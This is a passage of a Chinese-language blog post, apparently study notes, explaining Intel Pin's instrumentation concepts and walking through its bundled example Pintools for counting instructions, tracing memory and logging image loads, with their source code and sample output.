对所有实际执行的代码进行插桩，不管代码具体处于哪个 section 。虽然对于一些条件分支会存在异常，但是如果指令没有被执行过，就一定不会被插桩。 ","date":"2021-10-04","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/:2:1","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/"},{"categories":["Fuzz"],"content":"2. Pintools 在概念上，插桩主要包含两部分内容： 插桩机制（instrumentation code） 在什么位置插入什么样的代码 分析代码（analysis code） 在插桩点执行的代码 这两部分内容都通过 Pintool 这个可执行文件来实现。Pintool 可以看作是 Pin 中可以实现修改代码生成过程的插件。 Pintool 会向 Pin 注册插桩回调例程，每当需要生成新代码时， Pin 会调用这些回调例程。回调例程承担了检测插桩内容的作用，它会检查要生成的代码，检查其静态属性，并决定是否以及在何处注入对分析函数的调用。 分析功能收集有关应用程序的数据。Pin 确保根据需要保存和恢复整数和浮点寄存器状态，并允许将参数传递给函数。 Pintool 还可以为诸如线程创建或 fork 之类的事件注册通知回调例程，这些回调通常用于收集数据或工具初始化和清理。 因为 Pintool 采用的是类似插件的工作机制，所以必须运行在和 Pin 及插桩的可执行文件相同的地址空间内，所以 Pintool 可以访问可执行文件的全部数据，还会与可执行文件共享 fd 和其他进程信息。 在 Pintool 的开发过程中，分析代码的调优比插桩代码更重要，因为插桩代码只执行一次，但是分析代码会调用很多次。 ","date":"2021-10-04","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/:2:2","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/"},{"categories":["Fuzz"],"content":"3. Instrumentation Granularity 1. trace instrumentation 在一个代码序列第一次执行前进行插桩，这种粒度的插桩称为“trace instrumentation”。在这种模式下，Pintool 一次“trace”执行一次检查和插桩，“trace”是指从一个 branch 开始，以一个无条件跳转 branch 结束，包含 call 和 return。 Pin 会保证每个 trace 只有一个顶部入口，但是可能包含多个出口。如果一个分支连接到了一个 trace 的中间位置，Pin 会生成一个以该分支作为开始的新的 trace 。Pin 将 trace 切分成了基本块，每个基本块称为“BBL”，每个 BBL 是一个单一入口、单一出口的指令序列。如果有分支连接到了 BBL 的中间位置，会定义一个新的 BBL 。通常以 BBL 为单位插入分析调用，而不是对每个指令都插入，这样可以降低分析调用的性能消耗。trace instrumentation 通过 TRACE_AddInstrumentFunction API 调用。 因为 Pin 是在程序执行时动态发现程序的执行流，所以 BBL 的概念与传统的基本块的概念有所不同，说明如下： swtich(i){ case 4: total++; case 3: total++; case 2: total++; case 1: total++; case 0: default: break; } 在 IA-32 架构下，会生成如下类似的指令： .L7: addl $1, -4(%ebp) .L6: addl $1, -4(%ebp) .L5: addl $1, -4(%ebp) .L4: addl $1, -4(%ebp) 传统基本块的计算方式是会把每个 addl 指令作为一个单独的指令基本块，但是对于 Pin 来说，随着执行不同的 switch cases，Pin 会在 .L7 作为入口（从 .L7 依次向下执行）的时候生成包含所有4个指令的 BBL，在 .L6 输入的时候生成包含3个指令的 BBL，依此类推。所以，在 Pin 的统计方式里，如果代码分支走到了 .L7 ，只会计算一个 Pin BBL，但是4个传统概念上的基本块都被执行了。 Pin 在遇到一些特殊指令的时候会直接作为 trace 的结束位置，生成一个 BBL， 比如 cpuid, popf 以及 REP 为前缀的指令。REP 为前缀的指令都被当作隐式循环处理，在处理完第一次的迭代后，后面的每次迭代都作为一个单独的 BBL ，因此这种情况下，会看到比传统基本块统计方式统计出更多的 BBL。 2. instruction instrumentation Pintool 会在可执行文件的每条指令都进行插桩，这种模式使得开发者不必过多关注 trace 内部的迭代循环指令，因为如上面所说，包含循环的 trace 内部的特定的 BBL 和指令可能产生多次。instruction instrumentation 通过 INS_AddInstrumentFunction API 进行调用。 3. image instrumentation 通过“caching”插桩请求实现，会有额外的内存空间要求，属于一种“提前插桩”。image instrumentation 模式下，Pintool 在 IMG:Image Object第一次加载时，对整个 imgaes 进行检查和插桩， Pintool 可以遍历 image 的 sections：SEC:Section Object， 可以是 section 中的 routine：RTN:Routine，还可以是一个 routine 中的 instructions：INS。插入位置可以是例程或指令的前面或后面，都可以实现，使用的 API 为 IMG_AddInstrumentFunction 。 image instrumentation 需要有调试信息来确定 routine 的边界，所以在调用 PIN_Init 之前，需要先初始化符号信息 PIN_InitSysmbols。 4. routine instrumentation 通过“caching”插桩请求实现，会有额外的内存空间要求，属于一种“提前插桩”。routine instrumentation 模式下，Pintool 在 image 首次加载时就对整个 routine 进行检查和插桩，对 routine 中的每条指令都可以插桩，但是没有充分的信息可以将指令划分为 BBL。插入位置可以是执行例程或指令的前后。这种模式其实更大程度上属于 image instrumentation 的替代方法，使用的 API 为 RTN_AddInstrumentFunction。 需要注意的是，在 image 和 routine instrumentation 模式下，插桩时并不确定 routine 是否会被执行，但是通过识别 routine 的开始指令，可以遍历出执行过的 routine 的指令。 ","date":"2021-10-04","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/:2:3","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/"},{"categories":["Fuzz"],"content":"4. Symbols Pin 通过symbol object 来访问函数名， 但是 symbol 对象只能提供程序中的函数符号相关的信息，对于数据符号之类的信息必须通过其他工具获取。 Windows下，可以通过 dbghelp.dll 文件获取，但是可能出现死锁问题；Linux下可以通过 libelf.so 或 libdwarf.so 文件获取符号信息。 ","date":"2021-10-04","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/:2:4","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/"},{"categories":["Fuzz"],"content":"3. Examples 本章主要是通过运行一些 Pin 内置的样例 Pintool，来实际感受一下 Pin 的插桩过程。实践出真知。 ","date":"2021-10-04","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/:3:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/"},{"categories":["Fuzz"],"content":"1. Building the example tools ia32 架构的样例： $ cd source/tools/ManualExamples $ make all TARGET=ia32 ia64 架构的样例： $ cd source/tools/ManualExamples $ make all TARGET=intel64 编译并运行某个样例： $ cd source/tools/ManualExamples $ make inscount0.test TARGET=intel64 编译某个样例但不运行： $ cd source/tools/ManualExamples $ make obj-intel64/inscount0.so TARGET=intel64 # $ make obj-ia32/inscount0.so TARGET=ia32 ","date":"2021-10-04","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/:3:1","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/"},{"categories":["Fuzz"],"content":"2. Simple Instruction Count （指令插桩） 功能：统计执行过的指令的总数。 运行和查看输出： $ ../../../pin -t obj-intel64/inscount0.so -o inscount.out -- /bin/ls Makefile atrace.o imageload.out itrace proccount Makefile.example imageload inscount0 itrace.o proccount.o atrace imageload.o inscount0.o itrace.out $ cat inscount.out Count 422838 # 输出文件存在默认名称，可以使用-o参数指定输出文件名。 原理：在每个指令前插入对 docount 的调用，并将结果保存在 inscount.out 文件中。 源码 source/tools/ManualExamples/inscount0.cpp： #include \u003ciostream\u003e#include \u003cfstream\u003e#include \"pin.H\" using std::cerr; using std::endl; using std::ios; using std::ofstream; using std::string; ofstream OutFile; // The running count of instructions is kept here // make it static to help the compiler optimize docount static UINT64 icount = 0; // 这里就是我们调用的桩代码 VOID docount() { icount++; } // Pin calls this function every time a new instruction is encountered // 遇到一条新指令，调用一次该函数 VOID Instruction(INS ins, VOID* v) { // Insert a call to docount before every instruction, no arguments are passed // 指定调用的桩代码函数，执行插入操作，没有对桩代码函数进行传参 INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_END); } // 处理输出文件，默认文件名为“inscount.out” KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"inscount.out\", \"specify output file name\"); // This function is called when the application exits VOID Fini(INT32 code, VOID* v) { // Write to a file since cout and cerr maybe closed by the application // 将输出保存到文件 OutFile.setf(ios::showbase); OutFile \u003c\u003c \"Count \" \u003c\u003c icount \u003c\u003c endl; OutFile.close(); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This tool counts the number of dynamic instructions executed\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ /* argc, argv are the entire command line: pin -t \u003ctoolname\u003e -- ... */ /* ===================================================================== */ int main(int argc, char* argv[]) { // Initialize pin 初始化 if (PIN_Init(argc, argv)) return Usage(); OutFile.open(KnobOutputFile.Value().c_str()); // Register Instruction to be called to instrument instructions // 注册插桩函数 INS_AddInstrumentFunction(Instruction, 0); // Register Fini to be called when the application exits // 注册程序退出时的处理函数 PIN_AddFiniFunction(Fini, 0); // Start the program, never returns // 开始执行 PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/:3:2","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/"},{"categories":["Fuzz"],"content":"3. Instruction Address Trace（指令插桩） 功能：打印执行的指令的地址 运行和查看输出： $ ../../../pin -t obj-intel64/itrace.so -- /bin/ls Makefile atrace.o imageload.out itrace proccount Makefile.example imageload inscount0 itrace.o proccount.o atrace imageload.o inscount0.o itrace.out $ head itrace.out 0x40001e90 0x40001e91 0x40001ee4 0x40001ee5 0x40001ee7 0x40001ee8 0x40001ee9 0x40001eea 0x40001ef0 0x40001ee0 $ 原理：在调用分析程序时，Pin 允许传递指令指针、寄存器当前值、内存操作的有效地址、常量等数据给分析程序。完整的可传递的参数的类型如下：IARG_TYPE。将指令计数程序中的参数更改为 INS_InsertCall 来传递即将执行的指令的地址，将 docount 更改为 printip 来打印指令的地址，最后将输出写入到文件 itrace.out 中。 源码``source/tools/ManualExamples/itrace.cpp`: #include \u003cstdio.h\u003e#include \"pin.H\"FILE* trace; // 在每条指令执行前都会被调用，打印出当前指令的地址 VOID printip(VOID* ip) { fprintf(trace, \"%p\\n\", ip); } // 遇到一条新指令调用一次 VOID Instruction(INS ins, VOID* v) { // 在每条指令前插入对 printip 函数的调用，并传递 ip 参数 INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)printip, IARG_INST_PTR, IARG_END); } // 结束函数 VOID Fini(INT32 code, VOID* v) { fprintf(trace, \"#eof\\n\"); fclose(trace); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { PIN_ERROR(\"This Pintool prints the IPs of every instruction executed\\n\" + KNOB_BASE::StringKnobSummary() + \"\\n\"); return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { trace = fopen(\"itrace.out\", \"w\"); // 初始化 if (PIN_Init(argc, argv)) return Usage(); // 桩指令注册 INS_AddInstrumentFunction(Instruction, 0); // 结束逻辑注册 PIN_AddFiniFunction(Fini, 0); // 开始执行，不返回 PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/:3:3","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/"},{"categories":["Fuzz"],"content":"4. Memory Reference Trace （指令插桩） 功能：内存引用追踪（只对读写内存的指令插桩） 运行和查看输出： $ ../../../pin -t obj-intel64/pinatrace.so -- /bin/ls Makefile atrace.o imageload.o inscount0.o itrace.out Makefile.example atrace.out imageload.out itrace proccount atrace imageload inscount0 itrace.o proccount.o $ head pinatrace.out 0x40001ee0: R 0xbfffe798 0x40001efd: W 0xbfffe7d4 0x40001f09: W 0xbfffe7d8 0x40001f20: W 0xbfffe864 0x40001f20: W 0xbfffe868 0x40001f20: W 0xbfffe86c 0x40001f20: W 0xbfffe870 0x40001f20: W 0xbfffe874 0x40001f20: W 0xbfffe878 0x40001f20: W 0xbfffe87c $ 原理：Pin 中包含可以对指令进行分类和检查功能的 API，通过调用该 API 可以实现对某一类功能的函数的追踪。 源码source/tools/ManualExamples/itrace.cpp： /* * This file contains an ISA-portable PIN tool for tracing memory accesses. */ #include \u003cstdio.h\u003e#include \"pin.H\"FILE* trace; // 打印地址读的指令的地址 VOID RecordMemRead(VOID* ip, VOID* addr) { fprintf(trace, \"%p: R %p\\n\", ip, addr); } // 打印地址写的指令的地址 VOID RecordMemWrite(VOID* ip, VOID* addr) { fprintf(trace, \"%p: W %p\\n\", ip, addr); } // 使用谓词函数调用来检测内存访问 // 每个读和写的指令都会调用 VOID Instruction(INS ins, VOID* v) { // 获取指令中的内存操作数计数 UINT32 memOperands = INS_MemoryOperandCount(ins); // 遍历指令中的每个内存操作数 for (UINT32 memOp = 0; memOp \u003c memOperands; memOp++) { // 如果是内存读 if (INS_MemoryOperandIsRead(ins, memOp)) { INS_InsertPredicatedCall(ins, IPOINT_BEFORE, (AFUNPTR)RecordMemRead, IARG_INST_PTR, IARG_MEMORYOP_EA, memOp, IARG_END); } // 在某些架构下，内存操作数可以同时用作读和写，例如 IA-32 的 %eax，这种情况下只记录一次 // 如果是写 if (INS_MemoryOperandIsWritten(ins, memOp)) { INS_InsertPredicatedCall(ins, IPOINT_BEFORE, (AFUNPTR)RecordMemWrite, IARG_INST_PTR, IARG_MEMORYOP_EA, memOp, IARG_END); } } } VOID Fini(INT32 code, VOID* v) { fprintf(trace, \"#eof\\n\"); fclose(trace); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { PIN_ERROR(\"This Pintool prints a trace of memory addresses\\n\" + KNOB_BASE::StringKnobSummary() + \"\\n\"); return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { if (PIN_Init(argc, argv)) return Usage(); trace = fopen(\"pinatrace.out\", \"w\"); // 注册桩函数 INS_AddInstrumentFunction(Instruction, 0); // 注册结束函数 PIN_AddFiniFunction(Fini, 0); // 开始，不返回 PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/:3:4","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/"},{"categories":["Fuzz"],"content":"5. Detecting the loading and Unloading of Images（image插桩） 功能：在 image 加载和卸载时打印信息到 trace 文件中。 执行和查看输出: $ ../../../pin -t obj-intel64/imageload.so -- /bin/ls Makefile atrace.o imageload.o inscount0.o proccount Makefile.example atrace.out imageload.out itrace proccount.o atrace imageload inscount0 itrace.o trace.out $ cat imageload.out Loading /bin/ls Loading /lib/ld-linux.so.2 Loading /lib/libtermcap.so.2 Loading /lib/i686/libc.so.6 Unloading /bin/ls Unloading /lib/ld-linux.so.2 Unloading /lib/libtermcap.so.2 Unloading /lib/i686/libc.so.6 $ 原理：本质上没有对 image 文件进行插桩。 源码 source/tools/ManualExamples/imageload.cpp： // // This tool prints a trace of image load and unload events // #include \"pin.H\"#include \u003ciostream\u003e#include \u003cfstream\u003e#include \u003cstdlib.h\u003eusing std::endl; using std::ofstream; using std::string; KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"imageload.out\", \"specify file name\"); ofstream TraceFile; // Pin 在 image 加载时调用该函数，在该例中没有进行插桩 VOID ImageLoad(IMG img, VOID* v) { TraceFile \u003c\u003c \"Loading \" \u003c\u003c IMG_Name(img) \u003c\u003c \", Image id = \" \u003c\u003c IMG_Id(img) \u003c\u003c endl; } // Pin 在 image 卸载时调用该函数，对于将要卸载的image无法进行插桩 VOID ImageUnload(IMG img, VOID* v) { TraceFile \u003c\u003c \"Unloading \" \u003c\u003c IMG_Name(img) \u003c\u003c endl; } // This function is called when the application exits // It closes the output file. VOID Fini(INT32 code, VOID* v) { if (TraceFile.is_open()) { TraceFile.close(); } } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { PIN_ERROR(\"This tool prints a log of image load and unload events\\n\" + KNOB_BASE::StringKnobSummary() + \"\\n\"); return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { // 符号初始化 PIN_InitSymbols(); // pin 初始化 if (PIN_Init(argc, argv)) return Usage(); TraceFile.open(KnobOutputFile.Value().c_str()); // 注册加载桩函数 IMG_AddInstrumentFunction(ImageLoad, 0); // 注册卸载桩函数 IMG_AddUnloadFunction(ImageUnload, 0); // 注册退出函数 PIN_AddFiniFunction(Fini, 0); // 开始执行，无返回 PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/:3:5","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/"},{"categories":["Fuzz"],"content":"6. More Efficient Instruction Counting （trace 插桩） 功能：计算 BBL （单入口单出口）数量 执行和查看输出： $ ../../../pin -t obj-intel64/inscount1.so -o inscount.out -- /bin/ls Makefile atrace.o imageload.out itrace proccount Makefile.example imageload inscount0 itrace.o proccount.o atrace imageload.o inscount0.o itrace.out $ cat inscount.out Count 707208 原理：在每个 BBL 进行插桩来替代在每个指令进行插桩，在进行计数时，以 bbl 为单位，每次增加每个 bbl 中的指令数量。 源码 source/tools/ManualExamples/inscount1.cpp： #include \u003ciostream\u003e#include \u003cfstream\u003e#include \"pin.H\"using std::cerr; using std::endl; using std::ios; using std::ofstream; using std::string; ofstream OutFile; // 保存指令的运行次数，设置为静态变量以帮助编译器优化 docount static UINT64 icount = 0; // 在每个 block 前都会被调用 VOID docount(UINT32 c) { icount += c; } // Pin 在遇到一个新的block 时进行调用，插入对 docount 函数的调用 VOID Trace(TRACE trace, VOID* v) { // 访问 trace 中的每个 bbl for (BBL bbl = TRACE_BblHead(trace); BBL_Valid(bbl); bbl = BBL_Next(bbl)) { // 在每个 bbl 前插入对 docount 函数的调用，传入指令数量 BBL_InsertCall(bbl, IPOINT_BEFORE, (AFUNPTR)docount, IARG_UINT32, BBL_NumIns(bbl), IARG_END); } } KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"inscount.out\", \"specify output file name\"); // 退出函数 VOID Fini(INT32 code, VOID* v) { // 写入到文件中，程序可能会关闭 cout 和 cerr OutFile.setf(ios::showbase); OutFile \u003c\u003c \"Count \" \u003c\u003c icount \u003c\u003c endl; OutFile.close(); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This tool counts the number of dynamic instructions executed\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { // 初始化 pin if (PIN_Init(argc, argv)) return Usage(); OutFile.open(KnobOutputFile.Value().c_str()); // 注册插桩函数 TRACE_AddInstrumentFunction(Trace, 0); // 注册退出函数 PIN_AddFiniFunction(Fini, 0); // 开始执行，不返回 PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/:3:6","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/"},{"categories":["Fuzz"],"content":"7. Procedure Instruction Count（routine插桩） 功能：计算一个 procedure 被调用的次数，以及每个 procedure 中执行的命令总数。 执行和检查输出： $ ../../../pin -t obj-intel64/proccount.so -- /bin/grep proccount.cpp Makefile proccount_SOURCES = proccount.cpp $ head proccount.out Procedure Image Address Calls Instructions _fini libc.so.6 0x40144d00 1 21 __deregister_frame_info libc.so.6 0x40143f60 2 70 __register_frame_info libc.so.6 0x40143df0 2 62 fde_merge libc.so.6 0x40143870 0 8 __init_misc libc.so.6 0x40115824 1 85 __getclktck libc.so.6 0x401157f4 0 2 munmap libc.so.6 0x40112ca0 1 9 mmap libc.so.6 0x40112bb0 1 23 getpagesize libc.so.6 0x4010f934 2 26 $ 源码 source/tools/ManualExamples/proccount.cpp： // // This tool counts the number of times a routine is executed and // the number of instructions executed in a routine // #include \u003cfstream\u003e#include \u003ciomanip\u003e#include \u003ciostream\u003e#include \u003cstring.h\u003e#include \"pin.H\"using std::cerr; using std::dec; using std::endl; using std::hex; using std::ofstream; using std::setw; using std::string; ofstream outFile; // 保存 procedure 的指令数 typedef struct RtnCount { string _name; string _image; ADDRINT _address; RTN _rtn; UINT64 _rtnCount; UINT64 _icount; struct RtnCount* _next; } RTN_COUNT; // 每个 procedure 的指令数的链表 RTN_COUNT* RtnList = 0; // 每条指令执行前调用 VOID docount(UINT64* counter) { (*counter)++; } const char* StripPath(const char* path) { const char* file = strrchr(path, '/'); if (file) return file + 1; else return path; } // Pin 在一个新的 rtn 执行时调用该函数 VOID Routine(RTN rtn, VOID* v) { // 对该routine设置一个计数器 RTN_COUNT* rc = new RTN_COUNT; // image unloaded 时， RTN 数据消失，所以在此处直接保存，后续 fini 中还要使用 rc-\u003e_name = RTN_Name(rtn); rc-\u003e_image = StripPath(IMG_Name(SEC_Img(RTN_Sec(rtn))).c_str()); rc-\u003e_address = RTN_Address(rtn); rc-\u003e_icount = 0; rc-\u003e_rtnCount = 0; // 添加到routines列表 rc-\u003e_next = RtnList; RtnList = rc; RTN_Open(rtn); // 在routine入口处插入一个call，增加call计数 RTN_InsertCall(rtn, IPOINT_BEFORE, (AFUNPTR)docount, IARG_PTR, \u0026(rc-\u003e_rtnCount), IARG_END); // 对于routine中的每条指令 for (INS ins = RTN_InsHead(rtn); INS_Valid(ins); ins = INS_Next(ins)) { // 插入对docount函数的调用，增加该rtn中的指令计数 INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_PTR, \u0026(rc-\u003e_icount), IARG_END); } RTN_Close(rtn); } // 退出函数，打印每个procedure的名字和计数 VOID Fini(INT32 code, VOID* v) { outFile \u003c\u003c setw(23) \u003c\u003c \"Procedure\" \u003c\u003c \" \" \u003c\u003c setw(15) \u003c\u003c \"Image\" \u003c\u003c \" \" \u003c\u003c setw(18) \u003c\u003c \"Address\" \u003c\u003c \" \" \u003c\u003c setw(12) \u003c\u003c \"Calls\" \u003c\u003c \" \" \u003c\u003c setw(12) \u003c\u003c \"Instructions\" \u003c\u003c endl; for (RTN_COUNT* rc = RtnList; rc; rc = rc-\u003e_next) { if (rc-\u003e_icount \u003e 0) outFile \u003c\u003c setw(23) \u003c\u003c rc-\u003e_name \u003c\u003c \" \" \u003c\u003c setw(15) \u003c\u003c rc-\u003e_image \u003c\u003c \" \" \u003c\u003c setw(18) \u003c\u003c hex \u003c\u003c rc-\u003e_address \u003c\u003c dec \u003c\u003c \" \" \u003c\u003c setw(12) \u003c\u003c rc-\u003e_rtnCount \u003c\u003c \" \" \u003c\u003c setw(12) \u003c\u003c rc-\u003e_icount \u003c\u003c endl; } } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This Pintool counts the number of times a routine is executed\" \u003c\u003c endl; cerr \u003c\u003c \"and the number of instructions executed in a routine\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { PIN_InitSymbols(); outFile.open(\"proccount.out\"); if (PIN_Init(argc, argv)) return Usage(); // 注册桩函数 RTN_AddInstrumentFunction(Routine, 0); // 注册程序退出时的 fini函数 PIN_AddFiniFunction(Fini, 0); // 开始执行，不返回 PIN_StartProgram(); return 0; } 下面是一些Pin的功能性特征说明样例。 ","date":"2021-10-04","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/:3:7","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/"},{"categories":["Fuzz"],"content":"8. Using PIN_SafeCopy() 功能：从源内存区域复制指定数量的字节数到目的内存区域。即使源或目的区域不可访问，此函数也可保证安全返回给caller。此外，该API还可以读写程序的内存数据。 执行和查看输出： $ ../../../pin -t obj-ia32/safecopy.so -- /bin/cp makefile obj-ia32/safecopy.so.makefile.copy $ head safecopy.out Emulate loading from addr 0xbff0057c to ebx Emulate loading from addr 0x64ffd4 to eax Emulate loading from addr 0xbff00598 to esi Emulate loading from addr 0x6501c8 to edi Emulate loading from addr 0x64ff14 to edx Emulate loading from addr 0x64ff1c to edx Emulate loading from addr 0x64ff24 to edx Emulate loading from addr 0x64ff2c to edx Emulate loading from addr 0x64ff34 to edx Emulate loading from addr 0x64ff3c to edx 源码source/tools/ManualExamples/safecopy.cpp: #include \u003cstdio.h\u003e#include \"pin.H\"#include \u003ciostream\u003e#include \u003cfstream\u003eusing std::cerr; using std::endl; std::ofstream* out = 0; //======================================================= // Analysis routines //======================================================= // 从内存转移到寄存器中 ADDRINT DoLoad(REG reg, ADDRINT* addr) { *out \u003c\u003c \"Emulate loading from addr \" \u003c\u003c addr \u003c\u003c \" to \" \u003c\u003c REG_StringShort(reg) \u003c\u003c endl; ADDRINT value; PIN_SafeCopy(\u0026value, addr, sizeof(ADDRINT)); return value; } //======================================================= // Instrumentation routines //======================================================= VOID EmulateLoad(INS ins, VOID* v) { // Find the instructions that move a value from memory to a register if (INS_Opcode(ins) == XED_ICLASS_MOV \u0026\u0026 INS_IsMemoryRead(ins) \u0026\u0026 INS_OperandIsReg(ins, 0) \u0026\u0026 INS_OperandIsMemory(ins, 1)) { // op0 \u003c- *op1 INS_InsertCall(ins, IPOINT_BEFORE, AFUNPTR(DoLoad), IARG_UINT32, REG(INS_OperandReg(ins, 0)), IARG_MEMORYREAD_EA,IARG_RETURN_REGS, INS_OperandReg(ins, 0), IARG_END); // Delete the instruction INS_Delete(ins); } } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This tool demonstrates the use of SafeCopy\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { // Write to a file since cout and cerr maybe closed by the application out = new std::ofstream(\"safecopy.out\"); // 初始化Pin，初始化符号 if (PIN_Init(argc, argv)) return Usage(); PIN_InitSymbols(); // 注册EmulateLoad函数以进行插桩 INS_AddInstrumentFunction(EmulateLoad, 0); // 开始执行，不返回 PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/:3:8","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/"},{"categories":["Fuzz"],"content":"9. Order of Instrumentation Pin提供了多种方式来控制analysis call的执行顺序，主要取决于insertion action(IPOINT)和call order(CALL_ORDER)。 执行和查看输出： $ ../../../pin -t obj-ia32/invocation.so -- obj-ia32/little_malloc $ head invocation.out After: IP = 0x64bc5e Before: IP = 0x64bc5e Taken: IP = 0x63a12e After: IP = 0x64bc5e Before: IP = 0x64bc5e Taken: IP = 0x641c76 After: IP = 0x641ca6 After: IP = 0x64bc5e Before: IP = 0x64bc5e Taken: IP = 0x648b02 源码source/tools/ManualExamples/invocation.cpp： #include \"pin.H\"#include \u003ciostream\u003e#include \u003cfstream\u003eusing std::cerr; using std::dec; using std::endl; using std::hex; using std::ios; using std::ofstream; using std::string; KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"invocation.out\", \"specify output file name\"); ofstream OutFile; /* * Analysis routines */ VOID Taken(const CONTEXT* ctxt) { ADDRINT TakenIP 